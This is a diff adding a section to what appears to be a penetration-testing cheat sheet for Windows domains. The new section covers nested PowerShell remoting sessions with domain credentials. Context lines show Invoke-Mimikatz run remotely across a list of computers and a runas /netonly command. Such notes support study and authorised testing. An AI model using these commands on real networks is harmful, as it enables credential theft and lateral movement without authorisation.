@@ -44,6 +44,14 @@ Invoke-Command -Scriptblock ${function:<function>} -Computername (Get-Content co
 Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Computername (Get-Content computers.txt)
 ```
 
+#### Pssession in pssession
+```
+Enter-PSSession -ComputerName <NAME>
+#in session
+$sess = New-PSSession ufc-webprod -Credential <DOMAIN>\<USER>
+Invoke-Command -Scriptblock {hostname; whoami;} -Session $sess
+```
+
 #### Runas other user
 ```
 runas /netonly /user:<DOMAIN>\<USER> cmd.exe
